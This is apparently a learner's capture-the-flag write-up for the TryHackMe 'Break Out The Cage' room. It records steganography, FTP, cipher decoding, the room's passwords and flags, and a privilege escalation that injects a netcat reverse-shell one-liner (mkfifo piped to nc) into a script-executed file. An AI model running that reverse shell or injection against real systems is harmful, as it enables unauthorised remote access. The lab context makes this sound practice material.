### Break Out The Cage ###

export IP=10.10.52.79
found a directory auditions and in that found a mp3 file
opened the file in audacity:
click on the file name: select spectrogram and zoom in by clicking the search+ icon :

found a key: namelesstwo

ftped into the machine with anonymous login and no password (which was something i should have knew)

found a dad_talks file with a hash of base64(also should have known) and after that vignere cipher(which i have nvr heard) which requires a key and i found a key:above

found the msg:
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes

# found the weston's :Mydadisghostrideraintthatcoolnocausehesonfirejokes

found a python script which executes a .quotes file and tried editing it this way:
os.system("wall " + \n + "usermod weston -G root")

didnt work so tried this(not mine):

echo "lol;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc myip 9001 >/tmp/f" > .quotes 

got a rev shell

got the user flag:
THM{M37AL_0R_P3N_T35T1NG}

there was aa email_backup folder and i missed it just hate myself right nw im just dependent on the writeups and i dont want to hopefully i will inprove in the future....

forund a cipher text in the third email:haiinspsyanileph and used face as the key with vignere cipher:
found the root password:cageisnotalegend

and thus found the root flag

THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}